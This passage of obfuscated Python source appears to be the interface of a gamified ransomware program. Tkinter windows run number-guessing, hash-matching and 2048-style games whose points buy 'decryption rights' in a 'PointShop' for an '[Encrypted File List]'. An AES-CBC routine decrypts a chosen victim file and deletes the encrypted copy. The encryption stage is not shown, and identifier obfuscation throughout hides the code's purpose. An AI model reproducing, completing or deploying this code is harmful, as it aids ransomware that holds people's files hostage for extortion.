    OOOO0OOO000000000 =Toplevel (O0O00000OO0OO00OO )#line:154
    OOOO0OOO000000000 .title ("GameWindow")#line:155
    OOOO0OOO000000000 .geometry ('600x450-1350+350')#line:156
    OOOO0OOO000000000 .configure (bg ="black")#line:157
    OOOO0OOO000000000 .wm_attributes ("-topmost",1 )#line:158
    OOOO0OOO000000000 .configure (bd =10 )#line:159
    OOOO00OOOO00OO000 =Listbox (OOOO0OOO000000000 ,width =60 ,height =18 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:160
    OOOO00OOOO00OO000 .place (x =-10 ,y =50 )#line:161
    OOOO0O0O0OO0OO000 =Listbox (OOOO0OOO000000000 ,width =20 ,height =18 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:162
    OOOO0O0O0OO0OO000 .place (x =440 ,y =50 )#line:163
    OO00000000O0OO00O =Label (OOOO0OOO000000000 ,bg ="black",fg ="red",width =10 ,text ="Game List",relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:164
    OO00000000O0OO00O .place (x =440 ,y =-7 )#line:165
    O0OOOOO00O000OOO0 =Label (OOOO0OOO000000000 ,bg ="black",fg ="red",text ="Game Rules",width =30 ,relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:166
    O0OOOOO00O000OOO0 .place (x =-10 ,y =-7 )#line:167
    def O0000O000OOO0O00O ():#line:168
        OOOO0O00O0OOOO0O0 =str (OOOO0O0O0OO0OO000 .curselection ())#line:169
        if OOOO0O00O0OOOO0O0 .split ('(')[1 ].split (",")[0 ]=="2":#line:170
            OOOO00OOOO00OO000 .delete (0 ,END )#line:171
            OOOO00OOOO00OO000 .insert (0 ,"the more difficult it will be and the higher your score will be!")#line:172
            OOOO00OOOO00OO000 .insert (0 ,"The more questions you answer,")#line:173
            OOOO00OOOO00OO000 .insert (0 ,"a score is given and the next question appears!")#line:174
            OOOO00OOOO00OO000 .insert (0 ,"a hash function and write it in the correct answer box,")#line:175
            OOOO00OOOO00OO000 .insert (0 ,"In this game, if you match a random string encrypted with")#line:176
            return 2 #line:177
        elif OOOO0O00O0OOOO0O0 .split ('(')[1 ].split (",")[0 ]=="0":#line:178
            OOOO00OOOO00OO000 .delete (0 ,END )#line:179
            OOOO00OOOO00OO000 .insert (0 ,"This is an up-down game.")#line:180
            OOOO00OOOO00OO000 .insert (1 ,"The rules of the game are to guess a random number between 1 and 100!")#line:181
            OOOO00OOOO00OO000 .insert (2 ,"Also, each time you get it right, you increase the range of numbers")#line:182
            OOOO00OOOO00OO000 .insert (3 ,"nd the number of points you can earn,")#line:183
            OOOO00OOOO00OO000 .insert (4 ,"but making a mistake lowers the number of points you can earn!")#line:184
            OOOO00OOOO00OO000 .insert (5 ,"Finally, in the first round, the number of points you can receive is 1 point.")#line:185
            return 1 #line:186
        elif OOOO0O00O0OOOO0O0 .split ('(')[1 ].split (",")[0 ]=="1":#line:187
            OOOO00OOOO00OO000 .delete (0 ,END )#line:188
            OOOO00OOOO00OO000 .insert (0 ,":>")#line:189
            return 0 #line:190
    def OO0OOO00O00O00OOO ():#line:193
        global O0OOO0O0OOO0000O0 #line:194
        if O0000O000OOO0O00O ()==2 :#line:195
            OO0O0O0O00OOOOOO0 =Toplevel (O0O00000OO0OO00OO )#line:196
            OO0O0O0O00OOOOOO0 .title ("GameWindow-HASH_GMAE")#line:197
            OO0O0O0O00OOOOOO0 .geometry ('600x450+1350+350')#line:198
            OO0O0O0O00OOOOOO0 .configure (bg ="black")#line:199
            OO0O0O0O00OOOOOO0 .wm_attributes ("-topmost",1 )#line:200
            OO0O0O0O00OOOOOO0 .configure (bd =10 )#line:201
            O0O00O0O0O00OOOO0 =Listbox (OO0O0O0O00OOOOOO0 ,width =84 ,height =7 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:202
            O0O00O0O0O00OOOO0 .place (x =-10 ,y =33 )#line:203
            OOO0O00OOOOOO0OO0 =Listbox (OO0O0O0O00OOOOOO0 ,width =84 ,height =7 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:204
            OOO0O00OOOOOO0OO0 .place (x =-10 ,y =195 )#line:205
            O0O0OO0O0OO00OOO0 =Label (OO0O0O0O00OOOOOO0 ,bg ="black",fg ="red",width =42 ,text ="[Decrypted Hash List]",relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:206
            O0O0OO0O0OO00OOO0 .place (x =-10 ,y =157 )#line:207
            OO00O0O00O0O0OOOO =Label (OO0O0O0O00OOOOOO0 ,bg ="black",fg ="red",text ="[Hash List]",width =42 ,relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:208
            OO00O0O00O0O0OOOO .place (x =-9 ,y =-7 )#line:209
            O00O000O0OO000O0O =Entry (OO0O0O0O00OOOOOO0 ,width =42 ,bg ="black",fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =4 )#line:210
            O00O000O0OO000O0O .place (x =-9 ,y =330 )#line:211
            def O0O0O0OO0OO0OO0O0 ():#line:212
                OO0O0O0O00OOOOOO0 .destroy ()#line:213
            def O0000OO00OOO000O0 ():#line:214
                global OOO00O000OO000000 #line:215
                global O0OO0OOO0O0O0O000 #line:216
                OOO00O000OO000000 =OO0O0O0OOO0000OO0 (2 +OOOOOO0O00O0O00O0 )#line:217
                O0OO0OOO0O0O0O000 =O0000000O000OOOOO (OOOOOO0O00O0O00O0 ,OOO00O000OO000000 )#line:218
                O0O00O0O0O00OOOO0 .insert (0 ,O0OO0OOO0O0O0O000 )#line:219
                O0O00O0O0O00OOOO0 .insert (0 ,OOO00O000OO000000 )#line:220
            def O0000O0OO0O000O0O ():#line:221
                global OO0O00OO00O0O0O0O #line:222
                global OOOOOO0O00O0O00O0 #line:223
                O0O00O00O00000O00 =O00O000O0OO000O0O .get ()#line:224
                O00O000O0OO000O0O .delete (0 ,END )#line:225
                if O0O00O00O00000O00 ==OOO00O000OO000000 :#line:226
                    OOO0O00OOOOOO0OO0 .insert (0 ,"Congratulations! That's right! Score added!")#line:227
                    OOO0O00OOOOOO0OO0 .insert (0 ,"Your answer:"+O0O00O00O00000O00 )#line:228
                    OO0O00OO00O0O0O0O +=OOOOOO0O00O0O00O0 +1 #line:229
                    OOOOOO0O00O0O00O0 +=2 #line:230
                    OOO0O00OOOOOO0OO0 .insert (0 ,"Difficulty increased!:"+str (OOOOOO0O00O0O00O0 ))#line:231
                    msgbox .showwarning (":)","Congratulations! That's right! Score added!")#line:232
                    msgbox .showwarning (":)","your answer:"+O0O00O00O00000O00 )#line:233
                else :#line:234
                    OOO0O00OOOOOO0OO0 .insert (0 ,"The answer is wrong! Please check again!")#line:235
                    OOO0O00OOOOOO0OO0 .insert (0 ,"your answer:"+O0O00O00O00000O00 )#line:236
                    msgbox .showwarning (":)","The answer is wrong! Please check again! ")#line:237
                    msgbox .showwarning (":)","your answer:"+O0O00O00O00000O00 )#line:238
            O0OO0OOO0OOOO0O0O =Button (OO0O0O0O00OOOOOO0 ,text ="Enter Your Answer",width =18 ,bg ="black",fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =O0000O0OO0O000O0O )#line:239
            O0OOOO00O000OOO0O =Button (OO0O0O0O00OOOOOO0 ,text ="Exit Game",bg ="black",width =10 ,fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =O0O0O0OO0OO0OO0O0 )#line:240
            O0O0O0O00O0O000OO =Button (OO0O0O0O00OOOOOO0 ,text ="Get Hash",bg ="black",width =9 ,fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =O0000OO00OOO000O0 )#line:241
            O0OO0OOO0OOOO0O0O .place (x =-10 ,y =375 )#line:242
            O0OOOO00O000OOO0O .place (x =435 ,y =375 )#line:243
            O0O0O0O00O0O000OO .place (x =260 ,y =375 )#line:244
        elif O0000O000OOO0O00O ()==1 :#line:245
            OO0000O0O0O0OO000 =Toplevel (O0O00000OO0OO00OO )#line:246
            OO0000O0O0O0OO000 .title ("GameWindow-UD_GAME")#line:247
            OO0000O0O0O0OO000 .geometry ('600x450+950+600')#line:248
            OO0000O0O0O0OO000 .configure (bg ="black")#line:249
            OO0000O0O0O0OO000 .wm_attributes ("-topmost",1 )#line:250
            OO0000O0O0O0OO000 .configure (bd =10 )#line:251
            OOO000OOOOO0O0O00 =Listbox (OO0000O0O0O0OO000 ,width =84 ,height =18 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:252
            OOO000OOOOO0O0O00 .place (x =-10 ,y =33 )#line:253
            OOOO0O00OOO000OOO =Label (OO0000O0O0O0OO000 ,bg ="black",fg ="red",text ="[Up-Down]",width =42 ,relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:254
            OOOO0O00OOO000OOO .place (x =-9 ,y =-7 )#line:255
            O00O000O0OO000O0O =Entry (OO0000O0O0O0OO000 ,width =42 ,bg ="black",fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =4 )#line:256
            O00O000O0OO000O0O .place (x =-9 ,y =330 )#line:257
            def O0O0O0OO0OO0OO0O0 ():#line:258
                OO0000O0O0O0OO000 .destroy ()#line:259
            def OO000OO00O0OOO00O ():#line:260
                global OOO0O0OO0O0O00OO0 #line:261
                global O0O000OOOOO0O00OO #line:262
                global O0000000OO0OOOOOO #line:263
                OOO0O0OO0O0O00OO0 =random .randint (1 ,O0000000OO0OOOOOO )#line:264
                O0O000OOOOO0O00OO =0 #line:265
                OOO000OOOOO0O0O00 .insert (0 ," ")#line:266
                OOO000OOOOO0O0O00 .insert (0 ,"Game Start")#line:267
                OOO000OOOOO0O0O00 .insert (0 ,"---------------------------")#line:268
            def O0000O0OO0O000O0O ():#line:269
                global OO0O00OO00O0O0O0O #line:270
                global O0000000OO0OOOOOO #line:271
                global O0O000OOOOO0O00OO #line:272
                global OOO0O0OO0O0O00OO0 #line:273
                OO0OO0O00O00O0OO0 =O00O000O0OO000O0O .get ()#line:274
                O00O000O0OO000O0O .delete (0 ,END )#line:275
                if int (OO0OO0O00O00O0OO0 )==OOO0O0OO0O0O00OO0 :#line:276
                    OOO000OOOOO0O0O00 .insert (0 ,"Congratulations! That's right! Score added!")#line:277
                    OOO000OOOOO0O0O00 .insert (0 ,"Your answer:"+OO0OO0O00O00O0OO0 )#line:278
                    O0000000OO0OOOOOO +=100 #line:279
                    OO0O00OO00O0O0O0O +=1 +OO0O00OO00O0O0O0O #line:280
                    OOO000OOOOO0O0O00 .insert (0 ,"Difficulty increased!:"+str (O0000000OO0OOOOOO ))#line:281
                    OOO000OOOOO0O0O00 .insert (0 ,"---------------------------")#line:282
                    OOO000OOOOO0O0O00 .insert (0 ,"Game Stop")#line:283
                    msgbox .showwarning (":)","Congratulations! That's right! Score added!")#line:284
                    msgbox .showwarning (":)","your answer:"+OO0OO0O00O00O0OO0 )#line:285
                    OO000OO00O0OOO00O ()#line:286
                elif int (OO0OO0O00O00O0OO0 )>=OOO0O0OO0O0O00OO0 :#line:287
                    OOO000OOOOO0O0O00 .insert (0 ,"Down")#line:288
                    OOO000OOOOO0O0O00 .insert (0 ,"your answer:"+OO0OO0O00O00O0OO0 )#line:289
                    O0O000OOOOO0O00OO +=1 #line:290
                elif int (OO0OO0O00O00O0OO0 )<=OOO0O0OO0O0O00OO0 :#line:291
                    OOO000OOOOO0O0O00 .insert (0 ,"Up")#line:292
                    OOO000OOOOO0O0O00 .insert (0 ,"your answer:"+OO0OO0O00O00O0OO0 )#line:293
                    O0O000OOOOO0O00OO +=1 #line:294
                else :#line:295
                    OOO000OOOOO0O0O00 .insert (0 ,"The answer is wrong! Please check again!")#line:296
                    OOO000OOOOO0O0O00 .insert (0 ,"your answer:"+OO0OO0O00O00O0OO0 )#line:297
                    O0O000OOOOO0O00OO +=1 #line:298
                    msgbox .showwarning (":)","The answer is wrong! Please check again! ")#line:299
                    msgbox .showwarning (":)","your answer:"+OO0OO0O00O00O0OO0 )#line:300
            O0OO0OOO0OOOO0O0O =Button (OO0000O0O0O0OO000 ,text ="Enter Your Answer",width =18 ,bg ="black",fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =O0000O0OO0O000O0O )#line:301
            O0OOOO00O000OOO0O =Button (OO0000O0O0O0OO000 ,text ="Exit Game",bg ="black",width =10 ,fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =O0O0O0OO0OO0OO0O0 )#line:302
            O0O0O0O00O0O000OO =Button (OO0000O0O0O0OO000 ,text ="Game Start",bg ="black",width =10 ,fg ="red",relief ="groove",font =O0O0O0000O000OOOO ,bd =3 ,command =OO000OO00O0OOO00O )#line:303
            O0OO0OOO0OOOO0O0O .place (x =-10 ,y =375 )#line:304
            O0OOOO00O000OOO0O .place (x =435 ,y =375 )#line:305
            O0O0O0O00O0O000OO .place (x =260 ,y =375 )#line:306
        elif O0000O000OOO0O00O ()==0 :#line:309
            O0OOO0O0OOO0000O0 =2040 #line:310
            O0000000000OOO0OO =Toplevel (O0O00000OO0OO00OO )#line:311
            O0000000000OOO0OO .title ("GameWindow-2048_GAME")#line:312
            O0000000000OOO0OO .geometry ('720x790+950+600')#line:313
            O0000000000OOO0OO .configure (bg ="black")#line:314
            O0000000000OOO0OO .wm_attributes ("-topmost",1 )#line:315
            O0000000000OOO0OO .configure (bd =10 )#line:316
            def O0O0O0OO0OO0OO0O0 ():#line:317
                O0000000000OOO0OO .destroy ()#line:318
            def O000OOO000O00OO00 ():#line:319
                O00OOO00O000000OO =open (OO0O00OO00OOOOO00 +"\\Desktop\\SaveFile.txt","w")#line:320
                O00OOO00O000000OO .write ("=============================GameSaveData==============================="+"\n")#line:321
                O00OOO00O000000OO .write ("score="+str (O0OOO0O0OOO0000O0 )+"\n")#line:322
                O00OOO00O000000OO .write ("place="+str ([['1'],['2'],['3'],['4'],['5'],['6'],['7'],['8'],['9']])+"\n")#line:327
                O00OOO00O000000OO .write ("")#line:328
                O00OOO00O000000OO .write ("")#line:329
                O00OOO00O000000OO .write ("")#line:330
                O00OOO00O000000OO .write ("")#line:331
                O00OOO00O000000OO .write ("")#line:332
                O00OOO00O000000OO .write ("")#line:333
                O00OOO00O000000OO .write ("")#line:334
                O00OOO00O000000OO .write ("")#line:335
                O00OOO00O000000OO .write ("")#line:336
                O00OOO00O000000OO .close ()#line:337
            def OOO0OOO00000O0OOO ():#line:338
                OO00OO0OO0OO0OO0O =open (OO0O00OO00OOOOO00 +"\\Desktop\\SaveFile.txt","r")#line:339
                O0O00OO0O00O0O00O =OO00OO0OO0OO0OO0O .read ()#line:340
                OOO0OOOO0000O0OOO =len (O0O00OO0O00O0O00O )#line:341
                OOO00OO0OOO0O0O00 =OO00OO0OO0OO0OO0O .readlines (OOO0OOOO0000O0OOO )#line:342
                O0OOO0OO00O00O000 .insert (0 ,O0O00OO0O00O0O00O )#line:343
                O00OOO0OO0000OO0O =OO00OO0OO0OO0OO0O .readlines ()#line:344
                for O0OO0000O000OO0OO in O00OOO0OO0000OO0O :#line:345
                    O0OOO0OO00O00O000 .insert (0 ,O0OO0000O000OO0OO )#line:346
                OO00OO0OO0OO0OO0O .close ()#line:347
            def O0O00000000O0O0OO ():#line:349
                global O0OOO0O0OOO0000O0 #line:350
                if O0OOO0O0OOO0000O0 !=2048 :#line:351
                    OOO0O000O00OOO000 .insert (0 ,"2048")#line:352
                    O0OOO0O0OOO0000O0 +=2 #line:353
                    OOO0O000O00OOO000 .insert (0 ,O0OOO0O0OOO0000O0 )#line:354
                else :#line:355
                    OOO0O000O00OOO000 .insert (0 ,"you win")#line:356
            OOO0O000O00OOO000 =Listbox (O0000000000OOO0OO ,width =84 ,height =37 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:358
            OOO0O000O00OOO000 .place (x =-10 ,y =33 )#line:359
            O0O000O00000O0O00 =Label (O0000000000OOO0OO ,bg ="black",fg ="red",text ="[2048_GAME]",width =42 ,relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:360
            O0O000O00000O0O00 .place (x =-9 ,y =-7 )#line:361
            OOO0OO0000O000O00 =Label (O0000000000OOO0OO ,bg ="black",fg ="red",text ="[Score]",width =8 ,relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:362
            OOO0OO0000O000O00 .place (x =595 ,y =-7 )#line:363
            O0OOO0OO00O00O000 =Listbox (O0000000000OOO0OO ,width =84 ,height =8 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:364
            O0OOO0OO00O00O000 .place (x =-10 ,y =640 )#line:365
            OO00O00OO0OO0O0O0 =Listbox (O0000000000OOO0OO ,width =15 ,height =35 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:366
            OO00O00OO0OO0O0O0 .place (x =595 ,y =33 )#line:367
            O0OO0OOO0OOOO0O0O =Button (O0000000000OOO0OO ,text ="GAME-SAVE",width =10 ,bg ="black",fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 ,command =O000OOO000O00OO00 )#line:368
            O0OOOO00O000OOO0O =Button (O0000000000OOO0OO ,text ="EXIT-GAME",bg ="black",width =10 ,fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 ,command =O0O0O0OO0OO0OO0O0 )#line:369
            O0O0O0O00O0O000OO =Button (O0000000000OOO0OO ,text ="START-GAME",bg ="black",width =10 ,fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 ,command =O0O00000000O0O0OO )#line:370
            O0OOO0O0OOO0000OO =Button (O0000000000OOO0OO ,text ="Load_Data",bg ="black",width =10 ,fg ="red",relief ="groove",font =OO0O000O0O0O0O0O0 ,bd =3 ,command =OOO0OOO00000O0OOO )#line:371
            O0OO0OOO0OOOO0O0O .place (x =595 ,y =740 )#line:372
            O0OOOO00O000OOO0O .place (x =595 ,y =690 )#line:373
            O0O0O0O00O0O000OO .place (x =595 ,y =640 )#line:374
            O0OOO0O0OOO0000OO .place (x =595 ,y =590 )#line:375
    def O000O0000OO0OO0O0 ():#line:379
        OO00O0O000OO00O0O =Toplevel (O0O00000OO0OO00OO )#line:380
        OO00O0O000OO00O0O .title ("PointShop")#line:381
        OO00O0O000OO00O0O .geometry ('800x550+950+400')#line:382
        OO00O0O000OO00O0O .configure (bg ="black")#line:383
        OO00O0O000OO00O0O .wm_attributes ("-topmost",1 )#line:384
        OO00O0O000OO00O0O .configure (bd =10 )#line:385
        OOOOOO00OO00OO0O0 =Listbox (OO00O0O000OO00O0O ,width =112 ,height =6 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:386
        OOOOOO00OO00OO0O0 .place (x =-7 ,y =160 )#line:387
        OO00O0000OO000000 =Listbox (OO00O0O000OO00O0O ,width =112 ,height =9 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:388
        OO00O0000OO000000 .place (x =-7 ,y =310 )#line:389
        OOOOOOOO00O00OOO0 =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",text ="[Encrypted File List]",width =56 ,relief ="groove",bd =3 ,font =O0O0O0000O000OOOO )#line:390
        OOOOOOOO00O00OOO0 .place (x =-7 ,y =270 )#line:391
        OO00O00O0O0OOO0O0 =0 #line:392
        O0OOOOO0OO00O0OO0 =260 #line:393
        O00O000O00O0000O0 =520 #line:394
        OOOO0000OOO0OO0OO =10 #line:395
        O00O000OO00OOO00O =60 #line:396
        O00OO00O0O0O00OOO =110 #line:397
        O00OO0OOOO0OOO0OO =108 #line:398
        OOOOO00OO000O00O0 =0 #line:399
        def OO00O00O00O0O0OO0 ():#line:400
            global OOO000OO0O0O0OO00 #line:401
            global OO0O00OO00O0O0O0O #line:402
            if O0O00O00000O0O000 .get ()!=' ':#line:403
                if OO0O00OO00O0O0O0O >=100 *int (O0O00O00000O0O000 .get ()):#line:404
                    OOOOOO00OO00OO0O0 .insert (0 ,"The product has been successfully purchased!","Purchased:[Decrypt one file]"+"Product Quantity:"+O0O00O00000O0O000 .get ())#line:405
                    OO0O00OO00O0O0O0O -=100 *int (O0O00O00000O0O000 .get ())#line:406
                    OOOOOO00OO00OO0O0 .insert (0 ,"spent points:"+str (OO0O00OO00O0O0O0O ))#line:407
                    OOO000OO0O0O0OO00 +=int (O0O00O00000O0O000 .get ())#line:408
                else :#line:409
                    OOOOOO00OO00OO0O0 .insert (0 ,"Failed to purchase product!","Your points are low! Current Points:"+str (OO0O00OO00O0O0O0O ))#line:410
            else :#line:411
                OOOOOO00OO00OO0O0 .insert (0 ,"No product quantity selected! Please check the quantity!")#line:412
            O0O00O0O0O0OOOOO0 ()#line:413
        def OO0O0000OO0O0O00O ():#line:414
            global OOO000OO0O0O0OO00 #line:415
            global OO0O00OO00O0O0O0O #line:416
            if O0O00O00000O0O000 .get ()!=' ':#line:417
                if OO0O00OO00O0O0O0O >=1000 *int (OOOO0OOO00O000OOO .get ()):#line:418
                    OOOOOO00OO00OO0O0 .insert (0 ,"The product has been successfully purchased!","Purchased:[Decrypt 10 files]"+"Product Quantity:"+OOOO0OOO00O000OOO .get ())#line:419
                    OO0O00OO00O0O0O0O -=1000 *int (OOOO0OOO00O000OOO .get ())#line:420
                    OOOOOO00OO00OO0O0 .insert (0 ,"spent points:"+str (OO0O00OO00O0O0O0O ))#line:421
                    OOO000OO0O0O0OO00 +=int (OOOO0OOO00O000OOO .get ())*10 #line:422
                else :#line:423
                    OOOOOO00OO00OO0O0 .insert (0 ,"Failed to purchase product!","Your points are low! Current Points:"+str (OO0O00OO00O0O0O0O ))#line:424
            else :#line:425
                OOOOOO00OO00OO0O0 .insert (0 ,"No product quantity selected! Please check the quantity!")#line:426
            O0O00O0O0O0OOOOO0 ()#line:427
        def OO0O000OOO00O00OO ():#line:428
            global OOO000OO0O0O0OO00 #line:429
            global OO0O00OO00O0O0O0O #line:430
            if O0O00O00000O0O000 .get ()!=' ':#line:431
                if OO0O00OO00O0O0O0O >=10000 *int (O0O0O0O0OO00OO00O .get ()):#line:432
                    OOOOOO00OO00OO0O0 .insert (0 ,"The product has been successfully purchased!","Purchased:[Decrypt 100 files]"+"Product Quantity:"+O0O0O0O0OO00OO00O .get ())#line:433
                    OO0O00OO00O0O0O0O -=10000 *int (O0O0O0O0OO00OO00O .get ())#line:434
                    OOOOOO00OO00OO0O0 .insert (0 ,"spent points:"+str (OO0O00OO00O0O0O0O ))#line:435
                    OOO000OO0O0O0OO00 +=int (O0O0O0O0OO00OO00O .get ())*100 #line:436
                else :#line:437
                    OOOOOO00OO00OO0O0 .insert (0 ,"Failed to purchase product!","Your points are low! Current Points:"+str (OO0O00OO00O0O0O0O ))#line:438
            else :#line:439
                OOOOOO00OO00OO0O0 .insert (0 ,"No product quantity selected! Please check the quantity!")#line:440
            O0O00O0O0O0OOOOO0 ()#line:441
        def OOO0OO0OOOOOO0O0O ():#line:444
            global OOO000OO0O0O0OO00 #line:445
            global O0O0OOOO00OO00000 #line:446
            global OOO0OOOO00OOOOO0O #line:447
            global OOO0O0O0O0OOOOO00 #line:448
            global O0000OO00OOO0O0O0 #line:449
            if OOO000OO0O0O0OO00 !=0 :#line:450
                O0O0O0OO00OO0000O =str (OO00O0000OO000000 .curselection ())#line:451
                OO0O00O0O0OOO00O0 =O0O0O0OO00OO0000O .split ('(')[1 ].split (",")[0 ]#line:452
                O0000OO00OOO0O0O0 =OOO0OOOO00OOOOO0O [int (OO0O00O0O0OOO00O0 )]#line:453
                O0OOOO0OOOO0O0O00 (OOO0O0O0O0OOOOO00 ,O0000OO00OOO0O0O0 )#line:454
                os .remove (O0000OO00OOO0O0O0 )#line:455
                OOO0OOOO00OOOOO0O .remove (O0000OO00OOO0O0O0 )#line:456
                del O0O0OOOO00OO00000 [O0000OO00OOO0O0O0 ]#line:457
                OOO000OO0O0O0OO00 -=1 #line:458
                OOOOOO00OO00OO0O0 .insert (0 ,"The number of file decryption rights you have left:"+str (OOO000OO0O0O0OO00 ))#line:459
                OO00O0000OO000000 .insert (0 ,"Decryption success"+O0000OO00OOO0O0O0 )#line:460
                O0O00O0O0O0OOOOO0 ()#line:461
            else :#line:462
                OOOOOO00OO00OO0O0 .insert (0 ,"you don't have permission to decrypt the file")#line:463
        def O0O00O0O0O0OOOOO0 ():#line:464
            global OOO0OOOO00OOOOO0O
            OO00O0000OO000000 .delete (0 ,END )#line:465
            for O0O0O0O000000OOO0 in range (0 ,len (OOO0OOOO00OOOOO0O )):#line:466
                OO00O0000OO000000 .insert (O0O0O0O000000OOO0 ,OOO0OOOO00OOOOO0O [O0O0O0O000000OOO0 :O0O0O0O000000OOO0 +1 ])#line:467
        def OO000O000OOOO00O0 (O0OO0OO0O00O000O0 ):#line:468
            for OOO00O0OOO0OOOOO0 ,OOO00OO0O000OOOOO in O0O0OOOO00OO00000 .items ():#line:469
                if O0OO0OO0O00O000O0 ==OOO00O0OOO0OOOOO0 :#line:470
                    return OOO00OO0O000OOOOO #line:471
            return None #line:472
        def O0OOOO0OOOO0O0O00 (OO0OO00OO0O000O0O ,OO0000O00OOOOO000 ,O00O00O0O00O00OO0 =None ,O00O0OO0OOO000OOO =24 *1024 ):#line:473
            try :#line:474
                if not O00O00O0O00O00OO0 :#line:475
                    O00O00O0O00O00OO0 =os .path .splitext (OO0000O00OOOOO000 )[0 ]#line:476
                with open (OO0000O00OOOOO000 ,'rb')as OO00O0O0OO0OOO0O0 :#line:477
                    O0OO0OOO00OOOOOOO =struct .unpack ('<Q',OO00O0O0OO0OOO0O0 .read (struct .calcsize ('Q')))[0 ]#line:478
                    OO0OO00O0OOO000OO =OO000O000OOOO00O0 (OO0000O00OOOOO000 )#line:479
                    O00O0OO0000OO0OOO =AES .new (OO0OO00OO0O000O0O ,AES .MODE_CBC ,OO0OO00O0OOO000OO )#line:480
                    with open (O00O00O0O00O00OO0 ,'wb')as O00OOO00O0OO0O000 :#line:481
                        while True :#line:482
                            OO00O0OOOOO0OOOO0 =OO00O0O0OO0OOO0O0 .read (O00O0OO0OOO000OOO )#line:483
                            if len (OO00O0OOOOO0OOOO0 )==0 :#line:484
                                break #line:485
                            O00OOO00O0OO0O000 .write (O00O0OO0000OO0OOO .decrypt (OO00O0OOOOO0OOOO0 ))#line:486
                        O00OOO00O0OO0O000 .truncate (O0OO0OOO00OOOOOOO )#line:487
            except :#line:488
                pass #line:489
        O0O00O0OO0O00OOO0 =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",width =35 ,height =10 ,relief ="groove",bd =3 )#line:491
        O0O00O0OO0O00OOO0 .place (x =-5 ,y =OOOOO00OO000O00O0 )#line:492
        OO0O000O0OOO0O000 =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",width =35 ,height =10 ,relief ="groove",bd =3 )#line:493
        OO0O000O0OOO0O000 .place (x =255 ,y =OOOOO00OO000O00O0 )#line:494
        O0OO00O0OOO00OOO0 =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",width =37 ,height =10 ,relief ="groove",bd =3 )#line:495
        O0OO00O0OOO00OOO0 .place (x =515 ,y =OOOOO00OO000O00O0 )#line:496
        OO0OO00OO000OOOO0 =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",width =18 ,text ="[Decrypt one file]",relief ="groove",bd =3 ,font =O0000OOOO000OO0O0 )#line:497
        OO0OO00OO000OOOO0 .place (x =OO00O00O0O0OOO0O0 ,y =OOOO0000OOO0OO0OO )#line:498
        OO0OOOO00000O0O0O =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",text ="[Decrypt 10 files]",width =18 ,relief ="groove",bd =3 ,font =O0000OOOO000OO0O0 )#line:499
        OO0OOOO00000O0O0O .place (x =O0OOOOO0OO00O0OO0 ,y =OOOO0000OOO0OO0OO )#line:500
        O000O0OOOOO0O0OOO =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",text ="[Decrypt 100 files]",width =19 ,relief ="groove",bd =3 ,font =O0000OOOO000OO0O0 )#line:501
        O000O0OOOOO0O0OOO .place (x =O00O000O00O0000O0 ,y =OOOO0000OOO0OO0OO )#line:502
        OOO00O0O000O0O00O =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",width =18 ,text ="[100 Points]",relief ="groove",bd =3 ,font =O0000OOOO000OO0O0 )#line:503
        OOO00O0O000O0O00O .place (x =OO00O00O0O0OOO0O0 ,y =O00O000OO00OOO00O )#line:504
        OOOOOOOO00O00OOO0 =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",text ="[1000 Points]",width =18 ,relief ="groove",bd =3 ,font =O0000OOOO000OO0O0 )#line:505
        OOOOOOOO00O00OOO0 .place (x =O0OOOOO0OO00O0OO0 ,y =O00O000OO00OOO00O )#line:506
        OOO0O0OOO0O00O000 =Label (OO00O0O000OO00O0O ,bg ="black",fg ="red",text ="[10000 Points]",width =19 ,relief ="groove",bd =3 ,font =O0000OOOO000OO0O0 )#line:507
        OOO0O0OOO0O00O000 .place (x =O00O000O00O0000O0 ,y =O00O000OO00OOO00O )#line:508
        O0O00O00000O0O000 =Entry (OO00O0O000OO00O0O ,width =9 ,bg ="black",fg ="red",relief ="groove",font =O0000OOOO000OO0O0 ,bd =4 )#line:509
        O0O00O00000O0O000 .place (x =OO00O00O0O0OOO0O0 ,y =O00OO00O0O0O00OOO )#line:510
